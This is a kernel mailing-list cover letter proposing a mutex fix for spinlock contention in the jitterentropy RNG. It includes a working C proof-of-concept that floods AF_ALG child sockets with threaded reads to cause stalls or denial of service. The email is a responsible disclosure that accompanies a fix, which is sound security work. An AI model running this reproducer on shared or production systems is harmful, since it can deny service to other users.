Received: from mail-pj1-f50.google.com (mail-pj1-f50.google.com [209.85.216.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6ACBA387352
	for <linux-crypto@vger.kernel.org>; Mon, 30 Mar 2026 07:23:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774855436; cv=none; b=qRDL17aGty5Rk94NmWv1+BgqDcPM9fp0qZYdo3fnbVVajsqjxXNaENT7009TPbt6ju1rvEDKJvLl0EApaTPrYaoTGW1EPIi+hhDS+3xPMpayPYANjneKBV/EhInwH0yfINsBiH08uj2bxlltrRFFoUISm1DUs1Dt2sFvkhnjK5s=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774855436; c=relaxed/simple;
	bh=gAqjyYC28WGyQMzzNK5AtPJF90s+p2BZiC9T9AsjX+M=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=hkpz/6zFPC76Mcre2fI2hEEvyFHZgzw6RmchcMWpThhRqrkVlo243gHjysnrjCjTD2LIkR7qPFcCLoKNkUbNRRi+ib/xxlWzQzM0qg7UkaC5WBS/yAyrUvsdrJwhHS5x0S1A1lmwPMA3QbKliVDKfeG2kRLOl8U7y+XMDJEKrUw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HxFvpA5f; arc=none smtp.client-ip=209.85.216.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HxFvpA5f"
Received: by mail-pj1-f50.google.com with SMTP id 98e67ed59e1d1-35d8e548a05so2249504a91.1
        for <linux-crypto@vger.kernel.org>; Mon, 30 Mar 2026 00:23:55 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1774855435; x=1775460235; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=CjLkDqke3NGqt9byDUHJ8qt8++drz9s7pw6PZM65w0c=;
        b=HxFvpA5f5QoFEgcVX7jslkWC6aTjta7Csz4z56k34rLIQdKYjCMPSH4LTxN/hw1EqH
         tcEPILBVDLMa8Et4OtYz8RDZBfIUMgljyFpMHaC9Djr0/G51wGvVxaGhaAKXs3eVm8Jd
         y48XfVMFHfGifpRuQ+U0sRS2v7UlKKkumZXsGaZ0pDqKl9z2Ym9qU3B5v2NlZEyrbaNN
         myEGFIzksr/+3UrulStCnZhcMwhxWWd34WAqZmHhflIoh8NYaeuL/zjcy8NpG6ODmbmu
         toV8sO2NYNoRo/mrKZ/mfKRynJK0E4IEJnCJ7dTSugSPsAdOuGE2NOhX2YyBELi6H5/l
         uwnA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774855435; x=1775460235;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=CjLkDqke3NGqt9byDUHJ8qt8++drz9s7pw6PZM65w0c=;
        b=hcrNf1sbPnkE9WYt1nqnpYOMpT9ASO5+OEhSeqzZIEJkpoTPNCaT4KCKQ8zL0uB4Em
         +WfVF1kWZuZ77jNHhfVQH4g9jw73DC03gUX1JHbnylnEV9KxzcbyBMznQg+qAijOCfBt
         6n28bLolg865yN+e1NRubPCp7boSEz0Y/tU5/GSuXIvFwNEFQeYskffFbCSKXHMuTQVx
         BMQZIdgGRA/bUe18HYCkEgJPGpFgHNlf5mmdMRhG0NneJ21Rh+/+B8tLP/+TIWeov3D0
         CcgrStxf9X/o8CnyNHaeK/MCtWzev/1/TIvXJtVtfuy0L1Z5MJ0/YfsU+bXGSwk1T0St
         m/Kg==
X-Gm-Message-State: AOJu0YzgenF/OuxkqYe+0ihuQ1C4aztNoVYSo8wyKfB7CO3Nb+wY5CPV
	y6oJuRf5SNJSw9GMkA1IeyHDqPzKWi+C1Mk6I6Fe26j6i7GwDnTiUbywb5V0XGn2del0Ig==
X-Gm-Gg: ATEYQzzbB0wLEgrr9QPT5t7FH+T3ifATyZyB8rsPFmPrVSc8Vfs4wHCKRCFNKn3HFGb
	kE0n9gp90m4q77iL6GCdPjW3hREY+kSyspYDeA9dLZK5wAhw0BkpD3yklYRd2jXxA9KKh2W1wCl
	CJISNoBZnWsbfBqXv2duA6ZdE+8jXeypqh/DqyKtck92e5aLT/9v+xYrRVqbb3fiiUk56wB/1v4
	6J2/xEvI8ht+zTuyRHi6mQqOSO5eyOrZDXKiRdgOBxbzI9PyFS4/4328oZJ1oFv6lsP883rtfVb
	Qidz+xr1387my6OWSaDFPbLY4Z5nPro3YSY0kpyd9qkWhtfSgDGgrHtPkM5SWKk/mnSPrOX8Qsf
	jy4Dr8RyssczO7pVVkOk0gCJ+9ZkC0obBoInbcUP9XA8rQJT3imuRZo+8ldDal0+aZfMLsFLQKh
	c1YMNVtF+ayEwhpRJYu/oNSXDwQrTULWoNm/AEz4x5SuO4
X-Received: by 2002:a17:902:f607:b0:2b0:6829:9414 with SMTP id d9443c01a7336-2b0cdbe9dddmr128659685ad.8.1774855434450;
        Mon, 30 Mar 2026 00:23:54 -0700 (PDT)
Received: from cachyos-x8664.sustech.edu.cn ([116.6.234.169])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2b2427c3a4esm87002045ad.78.2026.03.30.00.23.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 30 Mar 2026 00:23:54 -0700 (PDT)
From: Haixin Xu <jerryxucs@gmail.com>
To: linux-crypto@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	smueller@chronox.de,
	yifanwucs@gmail.com,
	tomapufckgml@gmail.com,
	yuantan098@gmail.com,
	bird@lzu.edu.cn,
	jerryxucs@gmail.com
Subject: [PATCH 0/1] crypto: jitterentropy - fix long-held spinlock contention
Date: Mon, 30 Mar 2026 15:23:45 +0800
Message-ID: <cover.1774854094.git.jerryxucs@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Stephan and Herbert,

We have identified a bug in crypto/jitterentropy-kcapi.c,
introduced by commit bb5530e40824 and is present from v4.2-rc1
through v7.0-rc5.

The bug can be reached by the AF_ALG socket and may trigger
watchdog-visible stalls or denial of service on sufficiently
contended systems.

We propose a patch in the follow-up of this thread to mitigate this
issue by using a mutex instead.

---- details below ----

Bug details:

Multiple accepted child sockets from one AF_ALG parent share a single
jitterentropy_rng instance. jent_kcapi_random() serializes the state
of that generator and runs entropy collection, currently with a spinlock.
When multiple threads contend for the lock protecting that shared generator,
all child sockets serialize on one shared generator instance, so additional
readers accumulate lock contention on the same critical section. This can
lead to decreased throughput, noticeable lag on interactive systems and
potentially trigger watchdog-visible stalls or denial of service when the
number of threads used approaches the number of logical CPUs available.
The bug is potentially reachable by non-privileged users as AF_ALG is
enabled and available to non-privileged users by default on some
distributions, including Debian and Arch.

Required kernel config:

CONFIG_CRYPTO_JITTERENTROPY=y
CONFIG_CRYPTO_USER_API=y
CONFIG_CRYPTO_USER_API_RNG=y

Reproducer:
gcc -pthread poc.c -o poc
./poc <thread_count>

Note: tested on a Intel 13900H, noticeable lag appears when more than 12
of the 20 logical CPUs are utilized.

---8<--- BEGIN poc.c ---8<---
#define _GNU_SOURCE

#include <errno.h>
#include <linux/if_alg.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

struct worker_args {
	int fd;
};

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static long long nsec_delta(const struct timespec *start, const struct timespec *end)
{
	return (end->tv_sec - start->tv_sec) * 1000000000LL +
	(end->tv_nsec - start->tv_nsec);
}

static int bind_parent_socket(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	int fd;

	strcpy((char *)sa.salg_type, "rng");
	strcpy((char *)sa.salg_name, "jitterentropy_rng");

	fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (fd < 0)
		die("socket(AF_ALG/rng)");

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0)
		die("bind(AF_ALG/rng/jitterentropy_rng)");

	return fd;
}

static void *worker_main(void *opaque)
{
	struct worker_args *args = opaque;
	unsigned char buf[128];
	unsigned long i = 0;
	long long max_ns = 0;

	for (;;) {
		struct timespec start;
		struct timespec end;
		long long took_ns;
		ssize_t ret;

		if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
			die("clock_gettime(start)");

		ret = read(args->fd, buf, sizeof(buf));

		if (clock_gettime(CLOCK_MONOTONIC, &end) != 0)
			die("clock_gettime(end)");

		if (ret < 0)
			die("read(AF_ALG)");

		took_ns = nsec_delta(&start, &end);
		if (took_ns > max_ns)
			max_ns = took_ns;

		i++;
		if ((i % 10) == 0) {
			printf("iter=%lu took_ms=%.3f max_ms=%.3f\n",
			       i, took_ns / 1000000.0, max_ns / 1000000.0);
			fflush(stdout);
		}
	}

	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t *threads;
	struct worker_args *args;
	int parent_fd;
	int thread_count = argc > 1 ? atoi(argv[1]) : 2;
	int i;

	parent_fd = bind_parent_socket();
	if (parent_fd < 0)
		return EXIT_FAILURE;

	threads = calloc(thread_count, sizeof(*threads));
	args = calloc(thread_count, sizeof(*args));
	if (!threads || !args)
		die("calloc");

	for (i = 0; i < thread_count; i++) {
		args[i].fd = accept(parent_fd, NULL, 0);
		if (args[i].fd < 0)
			die("accept");

		if (pthread_create(&threads[i], NULL, worker_main, &args[i]) != 0)
			die("pthread_create");
	}

	for (i = 0; i < thread_count; i++)
		pthread_join(threads[i], NULL);

	return EXIT_SUCCESS;
}

---8<--- END poc.c ---8<---

Best regards
Haixin Xu

Haixin Xu (1):
  crypto: jitterentropy - replace long-held spinlock with mutex

 crypto/jitterentropy-kcapi.c | 14 +++++++-------
 1 file changed, 7 insertions(+), 7 deletions(-)


base-commit: 62397b493e14107ae82d8b80938f293d95425bcb
-- 
2.53.0

